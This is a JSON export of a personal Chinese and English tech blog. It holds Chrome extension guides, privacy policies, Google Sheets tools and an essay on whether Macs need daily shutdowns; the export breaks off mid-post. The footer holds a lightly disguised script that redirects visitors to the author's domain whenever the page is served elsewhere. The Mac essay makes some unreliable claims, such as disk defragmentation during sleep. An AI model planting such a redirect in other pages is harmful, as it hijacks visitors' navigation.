{"themeConfig":{"themeName":"lemon with search","postPageSize":10,"archivesPageSize":50,"siteName":"Raz1ner","siteDescription":"","footerInfo":"<span>Copyright © 2020-2025 Raz1ner - All Rights Reserved.</span>\n<script>(location.href.includes('dev-coco.github.io')||location.href.includes('localhost'))?'':window.open('https'+'://dev'+'-coco'+'.github.io/','_self')</script>\n","showFeatureImage":true,"domain":"https://dev-coco.github.io","postUrlFormat":"SLUG","tagUrlFormat":"SLUG","dateFormat":"YYYY-MM-DD","feedFullText":false,"feedCount":15,"archivesPath":"archives","postPath":"post","tagPath":"tag"},"posts":[{"content":"快速将表格内的图片保存到云端。 在日常数据处理中，经常会在表格中插入大量的临时缓存图片，但这些图片往往存活时间有限，一段时间后就会失效，无法预览。为了解决这一问题，开发了图片上传云端工具，能够快速、批量地将表格内的图片存储到云端，确保图片始终可见，避免因链接失效而无法查看图片。 功能介绍 需要登陆 Google 账号。第一次使用时，按照引导完成授权操作。首次授权之后就可以正常使用了。 灵活的列设置 在工具内，可以设置以下列内容： • 图片所在列（必填）：指定需要上传的图片数据。 • 图片识别文字列（可选）：启用后，工具会自动识别图片中的文字。 • 翻译中文列（可选）：如果启用，工具会自动将识别出的文字翻译为中文。 只有填写了对应列，才会开启相应功能，确保工具不会进行不必要的处理，提升效率。 自动识别表头 为了提升使用便捷性，工具具备自动识别表头的功能。如果表格的第一行包含以下关键词： • “图片” → 自动识别为 图片所在列，并进行上传。 • “图片识别文字” → 自动识别为 图片文字识别列，并开启 OCR 功能。 • “中文” → 自动识别为 翻译中文列，并自动翻译识别出的文字。 如果表头符合以上条件，工具会自动匹配列，用户无需手动设置，进一步减少操作步骤，提高效率。如果表头不符合条件，仍然可以手动选择列，确保灵活性。 支持图片格式与链接 目前仅支持图片链接和图片函数两种格式。 • 图片函数支持：可上传由函数生成的图片。例如：=IMAGE(&quot;https://xxxxxxx&quot;) • 图片链接支持：直接上传已有的图片链接。 上传完成后，原始的图片列的内容会被替换为云端图片的预览链接，方便后续查看和管理。 直观标记 默认会勾选「完成后标记颜色」功能，工具会在图片上传完成后自动标记颜色，上传成功的图片所在单元格会变为绿色背景，方便用户直观查看上传进度。 智能水印处理（可选） 部分图片可能带有水印，影响文字识别。开启“处理水印”功能后，系统会利用算法去除水印干扰，提升文字识别的准确性。 处理水印功能仅在特殊情况下使用，正常情况不需要开启。部分图片可能带有水印，图片识别文字的时候，会把水印的文字识别出来，导致识别的内容不准确。开启「处理水印」的功能后，工具会利用算法去除水印干扰，提升文字识别的准确性。 注意：此功能会稍微降低处理速度，建议仅在需要时开启，否则可能影响识别精度。 记录使用配置 工具会自动保存上一次使用的表格链接，下次打开时无需手动输入，直接加载上次操作的表格，提升使用效率。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"},{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"图片上传云端工具","feature":"https://dev-coco.github.io/post-images/Image-Upload-Google-Drive.png","link":"https://dev-coco.github.io/post/Image-Upload-Google-Drive/","stats":{"text":"3 min read","time":174000,"words":868,"minutes":3},"date":"2025-03-17 00:07:16","dateFormat":"2025-03-17"},{"content":"从网页截图中提取文本，并支持翻译功能。 插件下载：Chrome 插件合集 功能说明 由于 Chrome 扩展的权限限制，本工具仅适用于网页内截图，不支持系统级截图。 使用方法 点击浏览器右上角的扩展程序图标。 在网页内按住鼠标左键，拖动选取截图区域。 截图完成后，自动识别文字并复制到剪贴板。 设置与选项 安装扩展后，可通过 右键 → 选项 进入扩展设置界面。 右上角预览窗口 截图完成后，识别出的文本会显示在屏幕右上角的小窗口中。 • 双击窗口 可隐藏预览。 翻译功能 开启后，识别文本的同时进行翻译，并提供以下三种排版方式： • 仅显示翻译结果：直接用翻译文本替换原文。 • 纵向排列：第一行为原文，第二行为翻译结果。 • 横向排列：适用于表格粘贴，第一列为原文，第二列为翻译结果。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"截图 OCR","feature":"https://dev-coco.github.io/post-images/Screenshot-OCR.png","link":"https://dev-coco.github.io/post/Screenshot-OCR/","stats":{"text":"1 min read","time":54000,"words":271,"minutes":1},"date":"2025-03-14 21:23:09","dateFormat":"2025-03-14"},{"content":"打造您的正版软件宝库：全新精品正版软件列表网站上线！ 在如今的数字化时代，软件已经成为我们生活、学习和办公的必备工具。然而，面对琳琅满目的软件市场，选择一款高质量的正版软件常常让人无从下手。为了解决这个问题，我们推出了全新的网站——精品正版软件列表，一个专注于推荐优质正版软件的平台。 网站链接：https://dev-coco.github.io/Awesome-Software/ 为什么选择精品正版软件列表？ 严格筛选，品质保障 精心挑选市面上的优质软件，从社交通讯到办公软件，从效率工具到系统维护，涵盖多种类型，节省您的时间与精力。 正版软件，安全无忧 网站上所有软件均为正版，彻底告别盗版软件的潜在风险，支持开发者的同时，提供更稳定和可靠的使用体验。 精细分类，一目了然 网站将软件按照功能细致分类，无论是寻找一款合适的办公软件，还是特定用途的专业工具，都能在对应类别中快速定位，轻松找到心仪的软件。 直链下载，高效便捷 多数软件提供直链下载功能，无需多次跳转至官网查找下载按钮，点击即可获取软件，节约您的宝贵时间。 特殊标记，一目了然 为便于用户了解软件特性，部分软件附有清晰的开源或付费标识。在下载之前，用户即可全面掌握软件信息，选择更符合需求的工具。 ","tags":[{"name":"Windows","slug":"windows","used":true,"link":"https://dev-coco.github.io/tag/windows/"},{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"精品正版软件列表","feature":"https://dev-coco.github.io/post-images/Awesome-Software.png","link":"https://dev-coco.github.io/post/Awesome-Software/","stats":{"text":"2 min read","time":89000,"words":440,"minutes":2},"date":"2025-01-20 01:41:03","dateFormat":"2025-01-20"},{"content":"加快大文件下载速度。 多线程下载器是一种使用多线程技术，同时从服务器获取文件多个部分的下载工具。不同于传统的单线程下载器按顺序下载文件，多线程下载器会将文件分割成若干部分，并利用多个线程同时下载各个部分。下载完成后，下载器会将这些部分合并成完整的文件。 从 软件列表 下载多线程下载器软件。 点击多线程下载器的时候，会自动从剪切板获取下载链接并且预设，便于直接开始下载。 工作原理 文件分割 下载器首先将目标文件划分为若干个部分，每个部分由一个独立的线程负责下载。 多线程并行下载 每个线程可以同时向服务器发起请求，充分利用带宽资源。这种并行下载方式显著提升了下载速度。 数据合并 下载完成后，多线程下载器会按照正确的顺序将各个部分的数据拼接成完整的文件。 下载速度对比 原始浏览器下载速度 多线程下载器下载速度 相比原始浏览器，多线程下载器比浏览器快了 5 倍左右的下载速度。 要注意的是，实际下载速度会受到网络波动、宽带上限和磁盘读写速度等因素的影响，因此具体情况可能有所不同。测试结果仅供参考。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"多线程下载器","feature":"https://dev-coco.github.io/post-images/Multi-Threaded-Downloader.png","link":"https://dev-coco.github.io/post/Multi-Threaded-Downloader/","stats":{"text":"2 min read","time":81000,"words":405,"minutes":2},"date":"2025-01-19 02:14:42","dateFormat":"2025-01-19"},{"content":"市面上多种浏览器进行性能跑分测试并且整理出排名。 网站链接：https://dev-coco.github.io/Browser-Rank/ 这是一个专门对市面上多种浏览器进行性能测试，并且提供跑分的网站。 数据测试来源于 Speedometer3.0。它能从多方面对浏览器性能进行综合评估，例如：待办事项列表、富文本编辑器、渲染图表，浏览新闻网站等。然后再相同的设备上进行 10 次测试，并取其平均值作为最终的测试分数。分数越高代表浏览器性能越快。 以下截图仅供参考，网站内容会不定期更新，请查看网站以获取最新信息。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"浏览器性能排名","feature":"https://dev-coco.github.io/post-images/Browser-Rank.png","link":"https://dev-coco.github.io/post/Browser-Rank/","stats":{"text":"1 min read","time":39000,"words":189,"minutes":1},"date":"2025-01-08 02:38:49","dateFormat":"2025-01-08"},{"content":"探讨 Mac 设备每天关机的必要性，分析关机与休眠对性能、硬件寿命以及能耗的影响。 先说结论。如果你是经常使用 Mac 的用户，几乎每天都会使用，不推荐每天关机；如果只是偶尔使用，建议用完后关机，并在需要使用时再开机。 为了更深入地理解这一结论，我们先来看一看 Mac 设备的开机和休眠在背后都做了些什么。 macOS 的启动过程 每次开机时，macOS 都会执行 POST（Power-On Self Test，开机自检）测试，为了确保硬件正常工作。当 Mac 设备成功通过自检时，会听到标志性的启动音效。 以下是 POST 的主要步骤： 电源管理 系统通过电源管理单元（PMU）检测电源状态，确保电源供应正常。 初始化 CPU 初始化中央处理器（CPU），确保能够正常运行。 检查内存 系统对内存（RAM）进行基本的检查，确认内存是否可用并且没有故障。这通常包括写入随机数据并读取以验证数据的完整性。 检测硬件组件 系统会检测设备中的各种硬件组件，包括图形处理单元（GPU）、存储设备（SSD）、输入输出端口等，确保它们都能正常工作。 固件验证 系统会验证固件的完整性，确保 Boot ROM 中的代码可以安全执行。 启动选项加载 系统会加载启动选项，用户可以选择从不同的启动盘启动，或进入恢复模式等。 启动操作系统 如果所有开机自检操作都成功，将会启动引导加载程序，进而加载 macOS 操作系统。 macOS 休眠时会做什么 降低功耗 当 macOS 进入休眠状态时，系统会关闭大部分硬件组件的电源，包括显示器和硬盘，以显著降低能耗。尽管如此，某些关键组件仍会保持活跃，以便快速唤醒。 内存保持活跃 在休眠状态下，内存（RAM）中的数据仍然保持活跃。这意味着用户在休眠前打开的应用程序和文件会被保留，用户可以快速恢复到之前的工作状态，而无需重新加载所有内容。 安全休眠 在低电量情况下，系统会将内存内容保存到 SSD 中，以防止数据丢失。这种方式提供了额外的保护，确保即使在电量耗尽的情况下，用户的数据也不会丢失。 网络访问 如果启用了“唤醒以供网络访问”选项，macOS 可以在休眠状态下保持网络连接，允许远程访问和更新。这使得用户可以在设备处于休眠状态时，仍然能够接收邮件或进行其他网络活动。 定期维护任务 在休眠状态下，系统可能会执行一些后台维护任务，例如软件更新和磁盘清理。这些任务通常在设备处于低功耗状态时进行，以确保系统的健康和性能。 缓存清理 在休眠期间，macOS 会清理缓存文件，以释放内存并提高系统性能。这有助于防止系统变得臃肿，确保在下次唤醒时能够快速响应。 磁盘碎片整理 系统会进行磁盘碎片整理，优化存储空间的使用。这一过程有助于提高文件访问速度，确保数据的高效读取和写入。 软件更新 在休眠状态下，macOS 可以下载和安装软件更新。这意味着用户在下次唤醒时，系统已经是最新版本，减少了手动更新的需要。 搜索索引和文件同步 macOS 会在休眠时进行搜索索引更新和文件同步。这确保了 Spotlight 搜索和 iCloud 文件的最新状态，使用户在恢复工作时能够快速找到所需文件。 不推荐每天关机的原因 极致的使用体验 相比关机再开机的等待过程，macOS 的睡眠模式带来了极快的使用体验，轻按键盘或鼠标，解锁屏幕后即可进入工作状态。没有开机时的系统加载和启动音效打扰，更没有启动等待的过程。睡眠模式让电脑随时保持就绪状态，实现“即开即用”，为日常操作带来流畅无缝的使用感受。 优秀的延续性 对于需要多天完成的工作，睡眠模式在延续性上表现更为优异。如果每天关机，第二天重新打开电脑后，不仅需要手动启动所有软件，还可能打断之前的思路；而使用睡眠模式，可以完整保留之前的桌面布局、已启动的软件。一切都保持原样，让你快速恢复工作状态，效率和体验大幅提升。 通过睡眠模式，你可以更高效地管理未完成的任务，避免反复调整工作环境带来的麻烦和不必要的时间浪费。这种流畅、高效的使用方式，使得每天关机显得不再必要。 macOS 稳定性非常好 macOS 是基于 Unix 的操作系统，这意味着它继承了 Unix 系统的许多优良特性，包括内存管理和进程隔离。macOS 的内存管理机制相对成熟，能够有效地处理应用程序崩溃，通常只会关闭崩溃的应用，而不会影响其他正在运行的程序或操作系统本身。这种设计使得用户在使用 macOS 时，遇到应用程序崩溃的情况时，系统仍然能够保持响应。Unix 系统设计的一个核心原则是稳定性和安全性，这使得一个应用程序的崩溃通常不会影响整个操作系统。 相较之下，Windows 系统在早期版本中，尤其是 Windows 95 和 XP 时代，确实存在应用程序崩溃导致整个系统不稳定的情况。虽然 Windows 11 在稳定性和性能方面有了显著改善，但它仍然依赖于注册表和其他系统组件，这些组件的损坏可能会影响整个系统的运行。Windows 10 和 11 引入了一些新的内存管理和安全特性，例如更好的内存隔离和虚拟化技术，但整体架构仍然与 Unix 系统存在根本差异。 Windows 系统使用注册表来管理系统设置和应用程序配置，损坏的注册表项可能导致系统不稳定或应用程序无法正常运行。这种情况在 Unix 系统中较少发生，因为 Unix 系统的配置文件通常是分散的，且不依赖于单一的数据库结构。 所以 macOS 即使不关机也可以长时间稳定运行，不容易出现系统奔溃导致无法正常使用的情况，那么每天开关机的作用就不大了。而且每次开机都要进行一遍开机自检，在这个过程中会对硬件带来额外的压力，减少开关机次数有助于延长设备的寿命。 在 macOS 休眠的时候会定期执行一些维护任务，例如磁盘清理、碎片整理、软件更新等等，但是这些任务在开机正常使用的时候通常不会被执行，因为这些任务会占用 RAM 并且影响正常使用时的性能。如果用完后就将 Mac 设备关机，那就意味着 macOS 没有时间定期执行维护任务，这样会导致长期堵塞。 能耗 关于能耗方面我也进行了粗略测试。在开机过程期间，由于情况有限，无法测试开机过程中的能耗，只能进入系统后测试开机启动项运行的程序的能耗，由于优先级的原因可能会遗漏一小部分。 从测试情况来看，至少有 1.3 万毫瓦以上，如果是在开机自检的过程期间，这个能耗会更高。 在待机的期间，能耗消耗只有十几毫瓦，和开机的能耗相比相差了将近 1000 倍左右。 综合对比下来，待机消耗的电量是非常少的，如果每天都使用 Mac 设备，待机的耗电量会比每天开关机一次还要少一些。 ","tags":[{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"Mac 设备是否需要每天关机？","feature":"https://dev-coco.github.io/post-images/Mac-Device-Shutdown-Everyday.png","link":"https://dev-coco.github.io/post/Mac-Device-Shutdown-Everyday/","stats":{"text":"8 min read","time":451000,"words":2202,"minutes":8},"date":"2024-11-15 23:53:10","dateFormat":"2024-11-15"},{"content":"使用 ChatGPT 检测 Facebook 帖文是否违反平台政策。 许多用户在无意中发布的帖文可能会违反了社群守则，这样就会导致被平台惩罚和减少推送。但许多用户在发帖的时往往并不清楚为何被减少推送，也不明白具体违反了哪条社群守则。为了解决这个问题，可以通过 ChatGPT 等一类的 AI 工具进行检测。 Prompt Based on your understanding of the Facebook Community Standards, determine whether the following violates any of the Community Standards or engagement bait. If so, please tell me the specific reason and which policies was violated, do not narrate or ask questions, just answer me your judgment. think in English respond in Simplified Chinese don't give me other language, double check answer, content: 使用方法 将上面的提示词放入到 ChatGPT 或其它的 AI 工具，然后放入需要检测的内容发送即可。 效果如下 注意：检测的结果仅供参考，具体政策以 Facebook 官方发布的社群守则为准。 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"},{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"检测 Facebook 帖文是否违反政策","feature":"https://dev-coco.github.io/post-images/Detect-Facebook-Post.png","link":"https://dev-coco.github.io/post/Detect-Facebook-Post/","stats":{"text":"2 min read","time":62000,"words":250,"minutes":2},"date":"2024-10-19 09:03:21","dateFormat":"2024-10-19"},{"content":"在任意页面快速启动侧边栏 AI 网站。 插件下载：Chrome 插件合集 这是一个简洁且高效的 Chrome 插件，专为提升在各类网页上使用 AI 软件的便捷性而设计。通过点击插件图标，可以在任意页面上快速启动侧边栏，直接访问 ChatGPT 等 AI 网站。无论是写作、回答问题、编程协助，还是日常搜索，这款插件无需离开当前页面即可轻松与 AI 互动，极大优化的工作流效率。 使用方法 点击扩展程序图标，会打开侧边栏。 鼠标放在菜单上，会显示出来默认预设的一些 AI 网站，点击后即可在侧边栏打开该网站。也可以在输入框输入其它的网页。 下次打开侧边栏时，插件会自动加载上次使用的链接。 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"口袋 AI 使用方法","feature":"https://dev-coco.github.io/post-images/Pocket-AI.png","link":"https://dev-coco.github.io/post/Pocket-AI/","stats":{"text":"1 min read","time":47000,"words":230,"minutes":1},"date":"2024-09-25 23:05:20","dateFormat":"2024-09-25"},{"content":"Quickly Launch Sidebar AI Websites on Any Page. Extension download: Chrome Extension Collection This is a simple and efficient Chrome extension designed to enhance the ease of using AI software across various web pages. By clicking the plugin icon, you can quickly launch a sidebar on any page, providing direct access to AI websites such as ChatGPT. Whether it’s for writing, answering questions, coding assistance, or everyday searches, this plugin allows you to seamlessly interact with AI without leaving your current page, greatly optimizing your workflow efficiency. How to Use Click the extension icon to open the sidebar. Hover over the menu to display a list of default preset AI websites. Clicking on one will open the site in the sidebar. You can also type other website URLs into the input field. The next time you open the sidebar, the plugin will automatically load the last-used link. ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"Pocket AI User Guide","feature":"https://dev-coco.github.io/post-images/Pocket-AI-EN.png","link":"https://dev-coco.github.io/post/Pocket-AI-EN/","stats":{"text":"1 min read","time":55000,"words":149,"minutes":1},"date":"2024-09-25 23:04:31","dateFormat":"2024-09-25"},{"content":"Pocket AI Chrome Extension’s privacy policy is detailed here. Data Collection and Usage Our Chrome Extension, &quot;Pocket AI&quot; does not collect, store, or process any personal data from its users. It operates with no user accounts, backend services, or data collection mechanisms. No Tracking We do not track users' activities, do not use analytics, and do not employ cookies or similar technologies within the Chrome Extension. Data Sharing As we do not collect any data, there is nothing to share with third parties. Third-party services &quot;Pocket AI&quot; might include links to external websites or services. We are not liable for the privacy practices or content of these external sites. Please review their privacy policies before engaging with them. Security Our Extension is designed with your privacy in mind, and although it collects no data, we are committed to ensuring the security of our Chrome Extension. ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"Pocket AI Privacy Policy","feature":"https://dev-coco.github.io/post-images/Pocket-AI-Privacy-Policy.png","link":"https://dev-coco.github.io/post/Pocket-AI-Privacy-Policy/","stats":{"text":"1 min read","time":56000,"words":151,"minutes":1},"date":"2024-09-21 00:58:37","dateFormat":"2024-09-21"},{"content":"在网页选择元素并且获取内容。 插件下载：Chrome 插件合集 在任意网页点击插件，然后选择一个 HTML 元素。当鼠标放在 HTML 元素上时，鼠标悬停的区域会显示蓝色的方框。点击想要选中的 HTML 元素后，会在页面上出现一个选项框。在这里选择需要获取元素的属性。 这个功能类似于 document.querySelector 获取 HTML 元素的属性。例如选择文本，对应的就是 outerText 的效果。 插件内已经已经预设了一部分常用的属性，如果需要其他属性可以选择自定义，然后自行设置需要获取的属性。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"元素选择器 使用方法","feature":"https://dev-coco.github.io/post-images/Element-Selector.png","link":"https://dev-coco.github.io/post/Element-Selector/","stats":{"text":"1 min read","time":37000,"words":180,"minutes":1},"date":"2024-08-21 20:46:39","dateFormat":"2024-08-21"},{"content":"Select and extract content from webpage elements. Extension download: Chrome Extension Collection Click the extension on any webpage and choose an HTML element. When you hover over an HTML element, a blue box will appear around the area you’re pointing at. After selecting the desired HTML element, an options box will appear on the page. From here, you can choose the attributes you want to retrieve. This feature is similar to using document.querySelector to get HTML element attributes. For instance, selecting text will correspond to the outerText property. The extension comes with a preset list of common attributes. If you need additional attributes, you can select the custom option and configure the attributes you want to retrieve. ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"Element Selector User Guide","feature":"https://dev-coco.github.io/post-images/Element-Selector-EN.png","link":"https://dev-coco.github.io/post/Element-Selector-EN/","stats":{"text":"1 min read","time":44000,"words":119,"minutes":1},"date":"2024-08-21 20:46:26","dateFormat":"2024-08-21"},{"content":"Element Selector Chrome Extension’s privacy policy is detailed here. Data Collection and Usage Our Chrome Extension, &quot;Element Selector&quot; does not collect, store, or process any personal data from its users. It operates with no user accounts, backend services, or data collection mechanisms. No Tracking We do not track users' activities, do not use analytics, and do not employ cookies or similar technologies within the Chrome Extension. Data Sharing As we do not collect any data, there is nothing to share with third parties. Security Our Extension is designed with your privacy in mind, and although it collects no data, we are committed to ensuring the security of our Chrome Extension. ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"Element Selector Privacy Policy","feature":"https://dev-coco.github.io/post-images/Element-Selector-Privacy-Policy.png","link":"https://dev-coco.github.io/post/Element-Selector-Privacy-Policy/","stats":{"text":"1 min read","time":42000,"words":113,"minutes":1},"date":"2024-08-21 20:46:14","dateFormat":"2024-08-21"},{"content":"自定义打开新分页的链接。 插件下载：Chrome 插件合集 Chrome 浏览器并不支持设置新分页的链接。使用此插件可以实现使用自定义的链接替换打开的新分页。 使用方法 点击插件，在输入框内输入打开新分页时需要的替换的链接，然后打开开关即可。 同时也允许设置一些特殊链接，例如： 本地文件: file:///Users/Desktop/Raz1ner.png 书签栏: chrome://bookmarks 历史记录: chrome://history 其它插件的页面: chrome-extension://xxxxxxx/html/settings.html ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"自定义新分页链接 使用方法","feature":"https://dev-coco.github.io/post-images/Custom-New-Tab-URL.png","link":"https://dev-coco.github.io/post/Custom-New-Tab-URL/","stats":{"text":"1 min read","time":32000,"words":146,"minutes":1},"date":"2024-08-18 23:07:01","dateFormat":"2024-08-18"},{"content":"Customize the link to open a new tab. Extension download: Chrome Extension Collection Chrome browser does not support setting a custom link for new tabs. This extension allows you to replace the default new tab with a custom link. How to Use Click the plugin, enter the desired link for new tabs in the input field, and then turn on the switch. You can also set some special links, such as: Local files: file:///Users/Desktop/Raz1ner.png Bookmarks: chrome://bookmarks History: chrome://history Pages from other plugins: chrome-extension://xxxxxxx/html/settings.html ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"Custom New Tab URL User Guide","feature":"https://dev-coco.github.io/post-images/Custom-New-Tab-URL-EN.png","link":"https://dev-coco.github.io/post/Custom-New-Tab-URL-EN/","stats":{"text":"1 min read","time":35000,"words":94,"minutes":1},"date":"2024-08-18 23:06:52","dateFormat":"2024-08-18"},{"content":"Custom New Tab URL Chrome Extension’s privacy policy is detailed here. Data Collection and Usage Our Chrome Extension, &quot;Custom New Tab URL&quot; does not collect, store, or process any personal data from its users. It operates with no user accounts, backend services, or data collection mechanisms. No Tracking We do not track users' activities, do not use analytics, and do not employ cookies or similar technologies within the Chrome Extension. Data Sharing As we do not collect any data, there is nothing to share with third parties. Security Our Extension is designed with your privacy in mind, and although it collects no data, we are committed to ensuring the security of our Chrome Extension. ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"Custom New Tab URL Privacy Policy","feature":"https://dev-coco.github.io/post-images/Custom-New-Tab-URL-Privacy-Policy.png","link":"https://dev-coco.github.io/post/Custom-New-Tab-URL-Privacy-Policy/","stats":{"text":"1 min read","time":43000,"words":117,"minutes":1},"date":"2024-08-18 23:06:42","dateFormat":"2024-08-18"},{"content":"Chrome Extension Manager Chrome Extension’s privacy policy is detailed here. Data Collection and Usage Our Chrome Extension, &quot;Chrome Extension Manager&quot; does not collect, store, or process any personal data from its users. It operates with no user accounts, backend services, or data collection mechanisms. No Tracking We do not track users' activities, do not use analytics, and do not employ cookies or similar technologies within the Chrome Extension. Data Sharing As we do not collect any data, there is nothing to share with third parties. Security Our Extension is designed with your privacy in mind, and although it collects no data, we are committed to ensuring the security of our Chrome Extension. ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"Chrome Extension Manager Privacy Policy","feature":"https://dev-coco.github.io/post-images/Chrome-Extension-Manager-Privacy-Policy.png","link":"https://dev-coco.github.io/post/Chrome-Extension-Manager-Privacy-Policy/","stats":{"text":"1 min read","time":43000,"words":115,"minutes":1},"date":"2024-08-15 10:19:54","dateFormat":"2024-08-15"},{"content":"发布彩色背景帖文。 插件下载：Chrome 插件合集 功能 发布彩色背景帖文，可以附带图片。支持发布到小组或者时间线。 使用方法 注意：需要登陆 Facebook 账号后再使用。 在右侧点击「获取小组」可以获取账号上所有的小组列表。 在「帖文内容」输入需要发布的内容。 可选是否要附带图片，非必需。可以选择或者拖入一个图片。 在下方选择一个彩色背景。鼠标放在彩色背景上，可以查看发布后的样式。 在右侧可选多个小组，如果没有选择小组，默认发布到时间线。 全部设置好后点击「发布」。 发布成功后会在按钮下方显示发布后的链接。 发布后的效果如下图。 ","tags":[{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"彩色背景帖子 使用方法","feature":"https://dev-coco.github.io/post-images/Background-Color-Post.png","link":"https://dev-coco.github.io/post/Background-Color-Post/","stats":{"text":"1 min read","time":43000,"words":216,"minutes":1},"date":"2024-08-09 20:09:48","dateFormat":"2024-08-09"},{"content":"Publish a post with a colored background. Extension download: Chrome Extension Collection Features Publish posts with colored backgrounds and attach images if desired. Support for posting to groups or the timeline. How to Use Note: You need to log in to your Facebook account first. Click &quot;Get groups&quot; on the right to view a list of all the groups associated with your account. Enter the content for your post in the &quot;Post content&quot; field. Optionally, attach an image. You can either select or drag and drop an image. Select a colored background from the options below. Hover over the colored backgrounds to preview how the post will look once published. On the right, you can choose multiple groups. If no groups are selected, the post will be published to your timeline by default. Once all settings are configured, click &quot;Publish.&quot; After publishing, the link to the post will appear below the button. The published post will look like this: ","tags":[{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"Backrgound Color Post User Guide","feature":"https://dev-coco.github.io/post-images/Background-Color-Post-EN.png","link":"https://dev-coco.github.io/post/Background-Color-Post-EN/","stats":{"text":"2 min read","time":61000,"words":165,"minutes":2},"date":"2024-08-09 20:09:38","dateFormat":"2024-08-09"},{"content":"Background Color Post Chrome Extension’s privacy policy is detailed here. Data Collection and Usage Our Chrome Extension, &quot;Background Color Post&quot; does not collect, store, or process any personal data from its users. It operates with no user accounts, backend services, or data collection mechanisms. No Tracking We do not track users' activities, do not use analytics, and do not employ cookies or similar technologies within the Chrome Extension. Data Sharing As we do not collect any data, there is nothing to share with third parties. Third-party services &quot;Background Color Post&quot; might include links to external websites or services. We are not liable for the privacy practices or content of these external sites. Please review their privacy policies before engaging with them. Security Our Extension is designed with your privacy in mind, and although it collects no data, we are committed to ensuring the security of our Chrome Extension. ","tags":[{"name":"Facebook","slug":"facebook","used":true,"link":"https://dev-coco.github.io/tag/facebook/"}],"title":"Background Color Post Privacy Policy","feature":"https://dev-coco.github.io/post-images/Background-Color-Post-Privacy-Policy-EN.png","link":"https://dev-coco.github.io/post/Background-Color-Post-Privacy-Policy-EN/","stats":{"text":"1 min read","time":57000,"words":154,"minutes":1},"date":"2024-08-09 20:09:19","dateFormat":"2024-08-09"},{"content":"提示语侧边栏菜单，可自定义预设提示语。 插件下载：Chrome 插件合集 功能 浮动侧边栏菜单 在右侧加载一个可收缩的侧边栏菜单，方便随时使用。 储存提示语到列表 允许用户将自定义的提示语添加到列表中，方便管理和快速调用。 提示语可以是任何形式的文本，如代码片段、常用的查询问题或系统提示等。 可上下拖动提示语顺序 用户可以通过拖动提示语的条目来调整其在列表中的位置，实现个性化排序。 排序操作直观且灵活，提升用户操作的效率和体验。 修改添加后的提示语 支持对已添加的提示语进行编辑，用户可以随时更新或修改提示语内容。 点击预设提示语 点击预设的提示语来快速插入到输入框中，方便使用。 支持的平台 ChatGPT Claude DuckDuckGo AI Chat ‎Gemini Perplexity Poe 使用方法 下面以 ChatGPT 为例，其它平台操作方法一样。 打开网页后会在右侧加载菜单按钮，点击按钮即可打开菜单。注意：第一次安装列表里面没有任何内容，需要手动添加。 点击右下角的「添加」按钮，屏幕中间会显示提示框。输入标题和要预设的提示语内容。输入完成后点击确认。 点击「编辑」按钮，可以删除不需要的提示语。 设置好后，点击右侧的列表中任意一个提示语，可以预设到下面的输入框，不用再手动输入提示语，非常方便。 在列表中支持拖动排序，可以按照个性化调整顺序。 ","tags":[{"index":-1,"name":"AI 科技","slug":"ai-tech","used":true,"link":"https://dev-coco.github.io/tag/ai-tech/"}],"title":"Prompt Menu 使用方法","feature":"https://dev-coco.github.io/post-images/Prompt-Menu.png","link":"https://dev-coco.github.io/post/Prompt-Menu/","stats":{"text":"2 min read","time":93000,"words":460,"minutes":2},"date":"2024-08-08 06:08:49","dateFormat":"2024-08-08"},{"content":"Prompt sidebar menu. Customizable preset prompts. Extension download: Chrome Extension Collection Features Floating Sidebar Menu A collapsible sidebar menu appears on the right side for easy access anytime. Save Prompts to a List Allows users to add custom prompts to a list for easier management and quick retrieval. Prompts can be any form of text, such as code snippets, frequently used queries, or system messages. Reorder Prompts by Dragging Users can drag and drop prompt items to adjust their order in the list, enabling personalized sorting. The sorting process is intuitive and flexible, enhancing user efficiency and experience. Edit Added Prompts Supports editing of added prompts, allowing users to update or modify prompt content as needed. Click Preset Prompts Click on preset prompts to quickly insert them into the input field for convenience. Supported Platforms ChatGPT Claude DuckDuckGo AI Chat Gemini Perplexity Poe How to Use Using ChatGPT as an example, other platforms have similar procedures. After opening the webpage, a menu button will appear on the right side. Click the button to open the menu. Note: On the first installation, the list will be empty and needs to be manually populated. Click the &quot;Add&quot; button at the bottom right, and a prompt box will appear in the center of the screen. Enter the title and 